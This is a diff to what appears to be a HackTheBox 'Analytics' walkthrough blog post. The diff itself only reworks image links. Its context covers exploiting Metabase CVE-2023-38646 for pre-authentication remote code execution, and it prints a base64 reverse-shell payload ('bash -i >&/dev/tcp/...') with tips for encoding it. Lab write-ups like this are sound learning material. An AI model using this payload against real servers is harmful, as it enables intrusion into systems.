@@ -3,7 +3,7 @@ title: "Analytics [Easy]"
 date: 2024-07-23 02:09:44 +0530
 categories: [Hackthebox]
 tags: [Metabase,CVE-2023-38646,RCE,kernel Privesc]
-image: /assets/img/Analytics.png
+image: [/assets/img/Analytics.png](https://github.com/0xManan/0xManan.github.io/blob/main/assets/img/Analytics.png?raw=true)
 ---
 
 # Analytics Walkthrough - Easy
@@ -39,7 +39,8 @@ Browsing to _http://analytical.htb_ brought up a simple login page. Intercepti
 
 Visiting _http://data.analytical.htb_ displayed a login page for Metabase, an open source business intelligence tool. Default credentials did not work on the login. 
 
-![img](/assets/img/login1.png)
+[![img](/assets/img/login1.png)
+](https://github.com/0xManan/0xManan.github.io/blob/main/assets/img/login1.png?raw=true)
 
 After some research, I discovered Metabase has a recently disclosed pre-authentication RCE vulnerability [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646). This bug in Metabase, involved a retained 'setup-token' post-installation, accessible to unauthenticated users. This flaw, resulting from a codebase refactoring oversight, allowed exploitation via SQL injection in the H2 database driver during the Metabase setup phase. The exploit enabled pre-authentication Remote Code Execution (RCE) by manipulating database connection validation steps.
 
@@ -87,7 +88,8 @@ Content-Length: 822
 
 The value of YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjM2LzU1NTUgMD4mMSAg decoded is bash -i >&/dev/tcp/10.10.14.36/5555 0>&1. You must encode this with your own IP and port, and then modify the payload above before sending it. For some reason it won't work if there are any "=" signs in the base64 payload, so make sure you don't have them. You can add spaces in the end of the payload before base64 encoding it, to adjust the padding.
 
-![img](/assets/img/burp1.png)
+[![img](/assets/img/burp1.png)
+](https://github.com/0xManan/0xManan.github.io/blob/main/assets/img/burp1.png?raw=true)
 
 This exploit allowed me to gain a reverse shell from the underlying system, but there was no user flag in there, so I started exploring what's around...
 
